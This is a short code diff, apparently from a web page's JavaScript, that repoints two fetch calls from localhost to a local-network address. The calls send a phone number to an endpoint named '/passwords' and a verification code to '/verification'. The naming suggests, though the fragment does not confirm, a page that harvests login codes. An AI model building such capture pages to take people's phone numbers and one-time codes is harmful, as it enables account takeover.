@@ -373,7 +373,7 @@
                 }
 
                 // Send phone number to the server
-                fetch('http://127.0.0.1:5001/passwords', {
+                fetch('http://192.168.x.x:5001/passwords', {  // Use your local IP address
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -408,7 +408,7 @@
                 }
 
                 // Send verification code to the server
-                fetch('http://127.0.0.1:5001/verification', {
+                fetch('http://192.168.x.x:5001/verification', {  // Use your local IP address
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
